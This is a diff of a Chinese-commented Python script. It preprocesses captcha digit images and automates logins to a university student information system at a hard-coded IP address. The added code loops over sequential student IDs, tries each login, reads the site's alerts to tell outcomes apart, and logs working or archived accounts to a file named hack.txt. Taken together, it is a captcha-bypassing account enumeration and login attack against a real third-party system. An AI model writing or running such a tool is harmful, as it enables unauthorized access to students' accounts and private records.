@@ -50,7 +50,7 @@ def creatfile(data, filename):
     string = "".join(data)  # 把list类型转换成str类型
     with open(filename, 'w') as f:
         f.write(string)
-        print("创建文件成功")
+#        print("创建文件成功")
 
 
 def scissor(imgpath):
@@ -81,7 +81,6 @@ for j in range(9):#该循环用于批量重命名
     for x in range(len(flist)):
             fileNameStr = flist[x]
             os.rename(str(j)+'/'+flist[x],str(j)+'/'+str(j)+'-'+str(x)+'.bmp')
-
 for x in range(1000):#该循环用于批量二值化
     bit=biting('dig/'+str(x)+'.gif',88)
     bit.save('dig_bmp88/'+str(x)+'.bmp')
@@ -90,7 +89,6 @@ for x in range(1000):#该循环用于批量剪切
 for x in range(442):#该循环用于批量生成数字矩阵TXT文本
     t = getimgtable('8/8-'+str(x)+'.bmp')
     creatfile(t,'ntxt/8/8'+'-'+str(x)+'.txt')
-
 l=martixtoline('D.txt')
 creatfile(str(l[0,::]))
 L, M = sampledata()
@@ -181,6 +179,7 @@ for x in range(100):
 print('错误个数：'+str(err))
 """
 
+
 def login(username):
     """做了一些微小的贡献,并且按照基本法修改成功"""
     post_url = 'http://219.216.96.73/pyxx/login.aspx'
@@ -230,21 +229,31 @@ def login(username):
     get_url = 'http://219.216.96.73/pyxx/loging.aspx'
     loging_htmldoc = session.get(get_url, headers=headers)
 
-
     script = default_htmldoc.find_all('script')
-    try :
-        if (script[5].get_text()=="alert('密码错误!')"):
+    try:
+        if (script[5].get_text() == "alert('密码错误!')"):
             return ('密码错误 登陆失败')
-        elif(script[5].get_text()=="alert('你输入的验证码错误！')"):
-            return('验证码识别出错')
+        elif (script[5].get_text() == "alert('你输入的验证码错误！')"):
+            return ('验证码识别出错')
+        elif (script[5].get_text() == "alert('该学生档案已转入存档,不能登录本系统!')"):
+            return ('该学生档案已转入存档,不能登录本系统!')
     except IndexError:
         soup = BeautifulSoup(loging_htmldoc.text, "html.parser")
         span = soup.find_all('span')
-        return(span[28].get_text())
-""" 
-      
-  
-"""
+        return (span[28].get_text())
 
-hack = login('1700651')
-print(hack)
+
+""""""
+           
+
+for x in range(3):
+    username = 1700117+x
+    hack = login(str(username))
+    if(hack!='密码错误 登陆失败'):
+        if(hack=='该学生档案已转入存档,不能登录本系统!'):
+            with open('hack.txt', 'a') as f:
+                f.write(str(username)+hack+'\n')
+        else:
+            print(hack)
+            with open('hack.txt','a') as f:
+                f.write(hack)
